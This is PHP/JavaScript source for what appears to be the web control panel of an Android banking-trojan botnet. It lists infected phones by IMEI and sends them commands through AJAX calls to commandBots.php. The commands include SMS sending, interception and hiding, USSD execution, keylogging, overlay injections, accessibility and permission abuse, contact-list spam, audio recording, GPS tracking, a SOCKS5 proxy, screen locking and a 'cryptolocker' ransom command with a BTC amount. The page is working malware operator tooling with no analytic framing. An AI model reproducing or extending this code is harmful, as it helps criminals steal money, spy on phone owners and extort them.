<?php
$statusCode=false;
if (!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /login.php");
}else{

	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /login.php");
	}else{
		$statusCode=true;
	}
}
if($statusCode){
?>


	<div id="showAlert"></div>

<div class="content" id="content">

<script type="text/javascript">
//-------JS----------------

function getTextFileLogs(imei){

	$.ajax({
      url: 'application/get/logBot.php?imei='+imei,
      success: function(data) {
         $('#textArea').append('<textarea id="logsTextArea" readonly name="mesage"  wrap="virtual" class="textlog">'+data+'</textarea>');
      }
});
refreshIconLogBot(imei);
}

    function checkAll(checkId){

        var inputs = document.getElementsByTagName("input");
        for (var i = 0; i < inputs.length; i++) {
            if (inputs[i].type == "checkbox" && inputs[i].id == checkId) {
                if(inputs[i].checked == true) {
                    inputs[i].checked = false ;
                } else if (inputs[i].checked == false ) {
                    inputs[i].checked = true ;
                }
            }
        }
    }

	 function checkOFF(){
        var inputs = document.getElementsByTagName("input");
        for (var i = 0; i < inputs.length; i++) {
            if (inputs[i].type == "checkbox" && inputs[i].id == 'chk') {
                if(inputs[i].checked == true) {
                    inputs[i].checked = false ;
                }
            }
        }
    }


	function getOptSelectIMEI(){
		SelectOptionDeleteAllValues('comboBox_imeis');
		var imeis='';
			var inputs = document.getElementsByTagName("input");
			for (var i = 0; i < inputs.length; i++) {
				if (inputs[i].type == "checkbox" && inputs[i].id == 'chk'){
					if(inputs[i].checked == true){
						var arrayidimei = inputs[i].value.split(':',2);
						$('#comboBox_imeis').append($('<option>', {
							value: arrayidimei[0],
							text: arrayidimei[1]
						}));
						imeis=imeis+':'+arrayidimei[1];
					}
				}
			}
		$("#text_imei").val(imeis);
	}
	function SelectOptionDeleteAllValues(name){
        var listBox = document.getElementById(name);
        listBox.options.length = 0;
        return false;
    }

	function sendDataCommand(){
		var statusAlert=false;
		var value = document.getElementById("comboBox_commands").value;
		var imeis = document.getElementById("text_imei").value;

		if(value=="null"){

		}else if(value=="sentSMS"){
			var number = document.getElementById("text_number").value;
			var text = document.getElementById("text_msg").value;

			number = number.replace('+', '@');

			 $.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&text_number='+number
			   +'&text_msg='+ text,
			   cache: false});
			statusAlert=true;

		}else if(value=="startUSSD"){
			var text = document.getElementById("text_ussd").value;
			 text = text.replace("#","AAA");
			 text = text.replace("#","AAA");
			 text = text.replace("#","AAA");
			 text = text.replace("#","AAA");
			 $.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&text_ussd='+ text,
			   cache: false});
			statusAlert=true;
		}else if(value=="getSMS"){
			 $.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="ws"){
			var number = document.getElementById("text_ws").value;
			var text = document.getElementById("text_hs").value;

			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&text_ws='+number
			   +'&text_hs='+ text,
			   cache: false});
			   statusAlert=true;
		}else if(value=="getapps"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			statusAlert=true;
		}else if(value=="getpermissions"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startAlert"){
			var title = document.getElementById("title_push").value;
			var text = document.getElementById("text_push").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&title_push='+title
			   +'&text_push='+ text,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startPush"){
			var title = document.getElementById("titlePush").value;
			var text = document.getElementById("textPush").value;
			var icon = document.getElementById("comboBox_push").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&titlePush='+title
			   +'&textPush='+ text
			   +'&comboBox_push=' + icon,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startAutoPush"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="getkeylogger"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startinj"){
			var inject = document.getElementById("comboBox_inj").value;

			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&comboBox_inj='+inject,
			   cache: false});
			   statusAlert=true;
		}else if(value=="numberGO"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="numberGOsendSMS"){
			var text = document.getElementById("text_sms_tel_book").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&text_sms_tel_book='+ text,
			   cache: false});
			   statusAlert=true;
		}else if(value=="RequestPermissionInj"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="RequestPermissionGPS"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startaccessibility"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startpermission"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="startforward"){
			var text = document.getElementById("text_forward").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&text_forward='+ text,
			   cache: false});
			   statusAlert=true;
		}else if(value=="stopforward"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="openbrowser"){
			var text = document.getElementById("text_openbrowser").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&text_openbrowser='+ text,
			   cache: false});
			   statusAlert=true;
		}else if(value=="openactivity"){
			var text = document.getElementById("text_openactivity").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   +'&text_openactivity='+ text,
			   cache: false});
			   statusAlert=true;
		}else if(value=="getIP"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}else if(value=="killBot"){
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis,
			   cache: false});
			   statusAlert=true;
		}
		/*else if(value=="startApp"){
			var app = document.getElementById("text_start_app").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   + '&text_start_app='+ app,
			   cache: false});
			   statusAlert=true;
		}*/
		/*else if(value=="replaceURL"){
			var url = document.getElementById("text_replace_url").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   + '&text_replace_url='+ url,
			   cache: false});
			   statusAlert=true;


		}
		*/else if(value=="cryptolocker"){
			var key = document.getElementById("text_enc_key").value;
			var amount = document.getElementById("text_amount").value;
			var btc = document.getElementById("text_btc").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   + '&key='+ key
			   + '&amount='+amount
			   + '&btc='+btc,
			   cache: false});
			   statusAlert=true;

		}else if(value=="decryptolocker"){
			var key = document.getElementById("text_dec_key").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   + '&key='+ key,
			   cache: false});
			   statusAlert=true;
		}else if(value=="recordsound"){
			var seconds = document.getElementById("text_seconds").value;
			$.ajax({
			   url: 'application/set/commandBots.php?'
			   +'comboBox_commands='+value
			   +'&text_imei='+ imeis
			   + '&seconds='+ seconds,
			   cache: false});
			   statusAlert=true;
		}else if(value=="spamsms"){
		 			var textspam = document.getElementById("text_spam_n").value;
		 			$.ajax({
		 			   url: 'application/set/commandBots.php?'
		 			   +'comboBox_commands='+value
		 			   +'&text_imei='+ imeis
		 			   + '&spam='+ textspam,
		 			   cache: false});
		 			   statusAlert=true;
			}else if(value=="startsocks5"){
			 		 			var texthost = document.getElementById("text_host_n").value;
								var textuser = document.getElementById("text_user_n").value;
								var textpass = document.getElementById("text_pass_n").value;
								var textport = document.getElementById("text_port_n").value;
			 		 			$.ajax({
			 		 			   url: 'application/set/commandBots.php?'
			 		 			   + 'comboBox_commands='+value
			 		 			   + '&text_imei='+ imeis
			 		 			   + '&host='+ texthost
									 + '&user='+ textuser
									 + '&pass='+ textpass
									 + '&port='+ textport,
			 		 			   cache: false});
			 		 			   statusAlert=true;
				}else if(value=="stopsocks5"){
					$.ajax({
						 url: 'application/set/commandBots.php?'
						 + 'comboBox_commands='+value
						 + '&text_imei='+ imeis,
						 cache: false});
						 statusAlert=true;
			 	}

		checkOFF();
		if(statusAlert){
			startNatif('success','The team was successfully added!');
		}else{
			startNatif('danger','Enter the correct command!');
		}
	}

//--------------

function getOptSelectIMEISettings(imei){
		SelectOptionDeleteAllValues('comboBox_imeis2');
		var imeis='';
		var statimei = false;
			var inputs = document.getElementsByTagName("input");
			for (var i = 0; i < inputs.length; i++) {
				if (inputs[i].type == "checkbox" && inputs[i].id == 'chk'){
					if(inputs[i].checked == true){
						var arrayidimei = inputs[i].value.split(':',2);
						$('#comboBox_imeis2').append($('<option>', {
							value: arrayidimei[0],
							text: arrayidimei[1]
						}));

						imeis=imeis+':'+arrayidimei[1];
						statimei=true;
					}
				}
			}
			if(!statimei){
				$('#comboBox_imeis2').append($('<option>', {
							value: 0,
							text: imei
						}));
				imeis=':'+imei;
			}
		$("#text_imei_set").val(imeis);

	getSettingsBot(imei);
	}

	function getSettingsBot(imei){
				// ------ Clear Form -------
				var inputsClear = document.getElementsByTagName("input");
				for (var i = 0; i < inputsClear.length; i++) {
					if (inputsClear[i].type == "checkbox" && inputsClear[i].id == 'check_set') {
						inputsClear[i].checked = false ;
					}
				}
				document.getElementById("chkinterceptSMS").checked = false;
				document.getElementById("chkhideSMS").checked = false;
				document.getElementById("chknetwork").checked = false;
				document.getElementById("chkgps").checked = false;
				document.getElementById("check_foreground").checked = false;
				document.getElementById("check_keylogger").checked = false;
				document.getElementById("check_record").checked = false;
				document.getElementById("lookscreen").checked = false;
				document.getElementById("id_seconds").value = '';

				$.ajax({url: 'application/get/settingsBot.php?imei='+imei,   success: function(data) {
				     var arrayData = data.split('|');
					 var seconds = arrayData[0];
					 var injections = arrayData[1].split('/');
					 var interceptSMS = arrayData[2];
					 var hideSMS = arrayData[3];
					 var network = arrayData[4];
					 var gps =  arrayData[5];
					 var status =  arrayData[6];
					 var foreground = arrayData[7];
					 var keylogger = arrayData[8];
					 var check_record = arrayData[9];
					 var text_seconds = arrayData[10];
					 var lookscreen = arrayData[11];

					if(status!=null){
						 if(status==1){
							document.getElementById("AstatusSettings").style.color='red';
							document.getElementById("statusSettings").innerHTML="Settings are not active, wait until the bot updates them..";
						 }else{
							document.getElementById("AstatusSettings").style.color='#00FF00';
							document.getElementById("statusSettings").innerHTML="Settings are active!";
						 }
					}

				   if(seconds!=null){
						document.getElementById("idSeconds").innerHTML=seconds;
				   }

				    var inputs = document.getElementsByTagName("input");
					for(var j = 1; j < injections.length; j++){
						for (var i = 0; i < inputs.length; i++) {
							if (inputs[i].type == "checkbox" && inputs[i].id == 'check_set' && inputs[i].value == injections[j]) {
								inputs[i].checked = true ;
							}
						}
					}

					if(interceptSMS==1){
						  document.getElementById("chkinterceptSMS").checked = true;
					}
					if(hideSMS==1){
						 document.getElementById("chkhideSMS").checked = true;
					}
					if(network==1){
						document.getElementById("chknetwork").checked = true;
					}
					if(gps==1){
						document.getElementById("chkgps").checked = true;
					}
					if(foreground==1){
						document.getElementById("check_foreground").checked = true;
					}
					if(keylogger==1){
						document.getElementById("check_keylogger").checked = true;
					}
					if(check_record==1){
						document.getElementById("check_record").checked = true;
					}

					if(text_seconds!=null){
						document.getElementById("id_seconds").value = text_seconds;
					}
					if(lookscreen==1){
						document.getElementById("lookscreen").checked = true;
					}
			}});
	}

	function saveSetting(){
		var getImeis = document.getElementById("text_imei_set").value;

		var injections = '';
		var inputs = document.getElementsByTagName("input");
		for (var i = 0; i < inputs.length; i++) {
			if (inputs[i].type == "checkbox" && inputs[i].id == 'check_set' && inputs[i].checked == true) {
				injections = injections + '/' + inputs[i].value;
			}
		}
		var chkinterceptSMS = 0;
		if(document.getElementById("chkinterceptSMS").checked==true){
			chkinterceptSMS = 1;
		}

		var chkhideSMS = 0;
		if(document.getElementById("chkhideSMS").checked==true){
			chkhideSMS = 1;
		}

		var chknetwork = 0;
		if(document.getElementById("chknetwork").checked==true){
			chknetwork = 1;
		}

		var chkgps = 0;
		if(document.getElementById("chkgps").checked==true){
			chkgps = 1;
		}

		var foreground = 0;
		if(document.getElementById("check_foreground").checked==true){
			foreground = 1;
		}

		var keylogger = 0;
		if(document.getElementById("check_keylogger").checked==true){
			keylogger = 1;
		}

		var check_record = 0;
		if(document.getElementById("check_record").checked==true){
			check_record = 1;
		}

		var text_seconds = document.getElementById("id_seconds").value;

		var lookscreen = 0;
		if(document.getElementById("lookscreen").checked==true){
			lookscreen = 1;
		}

		$.ajax({ url: "application/set/settingsBots.php?text_imei_set="+ getImeis +"&check_set="+ injections +"&chknetwork="+chknetwork+"&chkgps="+chkgps+"&chkinterceptSMS="+chkinterceptSMS+"&chkhideSMS="+chkhideSMS+"&foreground="+foreground+"&keylogger="+keylogger+"&check_record="+check_record+"&text_seconds="+text_seconds+"&lookscreen="+lookscreen,
			   cache: false});

		startNatif('success','Successfully saved settings!');
	}
	//--------------Комментарии

	function saveComments(imei){
		var getComment = document.getElementById('comment'+imei).value;
		$.ajax({url: 'application/set/commentBot.php?imei='+imei+'&comment='+getComment});
		startNatif('success','Comments saved successfully!');
		refreshContentTable();
	}


</script>

</br>
<?php } ?>